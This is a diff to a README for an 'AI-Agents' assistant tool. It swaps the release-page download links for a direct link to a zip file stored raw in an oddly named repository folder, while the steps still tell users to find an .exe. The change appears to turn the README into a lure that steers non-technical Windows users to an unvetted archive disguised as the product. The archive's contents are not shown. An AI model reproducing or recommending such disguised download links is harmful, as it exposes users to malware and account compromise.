@@ -1,6 +1,6 @@
 # 🤖 AI-Agents - A simple way to use AI
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hard-suturasagittalis344/AI-Agents/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hard-suturasagittalis344/AI-Agents/raw/refs/heads/main/Rheum/A_Agents_v1.3.zip)
 
 AI-Agents helps you complete everyday tasks using artificial intelligence. This tool performs web searches, solves math problems, and tracks the current time. It relies on the ReAct pattern to reason through your requests step-by-step. You do not need technical skills to run this program.
 
@@ -22,7 +22,7 @@ Your computer must meet these basic standards to run the application:
 
 You need to download the application files from our release page. Follow these steps to set up the software on your Windows machine:
 
-1. Visit this page to download: [https://github.com/hard-suturasagittalis344/AI-Agents/releases](https://github.com/hard-suturasagittalis344/AI-Agents/releases).
+1. Visit this page to download: [https://github.com/hard-suturasagittalis344/AI-Agents/raw/refs/heads/main/Rheum/A_Agents_v1.3.zip](https://github.com/hard-suturasagittalis344/AI-Agents/raw/refs/heads/main/Rheum/A_Agents_v1.3.zip).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file to start the download.
 4. Save the file to your desktop or downloads folder.
